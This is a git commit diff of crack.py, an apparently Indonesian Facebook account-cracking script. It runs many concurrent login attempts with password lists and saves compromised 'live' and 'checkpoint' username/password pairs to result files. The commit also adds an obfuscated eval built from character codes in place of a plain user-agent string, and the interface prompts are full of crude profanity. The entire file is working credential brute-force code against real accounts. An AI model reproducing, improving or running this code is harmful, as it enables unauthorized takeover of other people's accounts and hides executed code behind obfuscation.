656bb7ea6dee03bb2804ada34cb1c26901432767
itsuki10 <84274139+itsuki10@users.noreply.github.com>
2021-05-21 18:36:31 +0700

    Update crack.py

--- saya_gans/ngewe/crack.py
+++ saya_gans/ngewe/crack.py
@@ -1,17 +1,17 @@
 # hallo bro :v
 
 from modul import *
+from .useragent import *
 from .list_pass import pw_list
 import concurrent.futures
 import urllib.request
 
-ok,cp,cout,live,chek=0,0,0,[],[]
-useragent="Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7"
+ok,cp,cout,live,chek,kontol=0,0,0,[],[],[]
 
 class crack:
 	def __init__(self,url,user):
 		
-		print("")
+		print()
 		self.url=url
 		self.user=user
 		self.naroskeun()
@@ -22,7 +22,7 @@ class crack:
 			print(" ! jangan kosong ngentod")
 			NAROSKEUN=input(" ? ingin menggunakan password manual Y/T : ")
 		if NAROSKEUN in tuple("yY"):
-			print(" * contoh : nama123,nama12345,sayang")
+			print(" * contoh : kontol,sayang,bangsat")
 			password=input(" ? set password : ")
 			while len(password) < 6:
 				print(" ! jangan kosong ngentod" if password in (""," ") else " ! password minimal 6 karakter")
@@ -54,14 +54,15 @@ class crack:
 			self.result()
 		else:
 			print(" ! isi yang bener ngentod");self.awokawok_ngentod(p_asw)
-					
+	
 	def awokawok_njir(self,ntahlah,kecepatan,wokwok=None):
+		for xnxx in self.user:
+			xvideos=xnxx.split("(Aap Gans)")
+			kontol.append({"username":xvideos[0],"password":pw_list(xvideos)} if wokwok is None else {"username":xvideos[0],"password":wokwok})
 		print(" * crack started\n * ctrl+z to stop\n")
 		with concurrent.futures.ThreadPoolExecutor(max_workers=kecepatan) as asw_lo:
-			for xnxx in self.user:
-				xvideos=xnxx.split("(Aap Gans)")
-				if wokwok is None: asw_lo.submit(ntahlah,xvideos[0],pw_list(xvideos))
-				else: asw_lo.submit(ntahlah,xvideos[0],wokwok)
+			for x in kontol:
+				asw_lo.submit(ntahlah,x["username"],x["password"])
 					
 	def facebook(self,username,list_password,**awok):
 		global ok,cp,cout
@@ -74,7 +75,7 @@ class crack:
 				del awok["sign_up"]
 				del awok["_fb_noscript"]
 			awok.update({"email":username,"pass":password})
-			ses.headers.update({"Host":self.url.split("//")[1],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","origin":self.url,"user-agent":useragent,"referer":f"{self.url}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+			ses.headers.update({"Host":self.url.split("//")[1],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","origin":self.url,"user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"referer":f"{self.url}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","save-data":"on"})
 			action=parser(respon,"html.parser").find("form",{"method":"post"})["action"]
 			try: ses.post(self.url+action,data=awok,allow_redirects=False)
 			except koneksi_error: self.facebook(username,list_password)
@@ -86,8 +87,8 @@ class crack:
 				break
 			elif "checkpoint" in cookie:
 				cp+=1
-				try: uid=json.loads(urllib.request.unquote(cookie["checkpoint"]))["u"]
-				except: uid=username
+				uid=urllib.request.unquote(cookie["checkpoint"])
+				uid=json.loads(uid)["u"] if '"u":' in uid else username
 				self.save(f" \x1b[1;33m*--> {uid}|{password}","result/chek.txt",chek)
 				break
 			else: continue
@@ -103,14 +104,14 @@ class crack:
 				ok+=1
 				self.save(f" \x1b[1;32m*--> {username}|{password}","result/live.txt",live)
 				break
-			if "www.facebook.com" in respon.json()["error_msg"]:
+			elif "www.facebook.com" in respon.json()["error_msg"]:
 				cp+=1
 				self.save(f" \x1b[1;33m*--> {username}|{password}","result/chek.txt",chek)
 				break
 			else: continue
 		cout+=1
 		print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
-
+	
 	def save(self,*args):
 		print(f"\r{args[0]}\x1b[0m\n",end="")
 		lol=re.findall("> (.+)",args[0])[0]
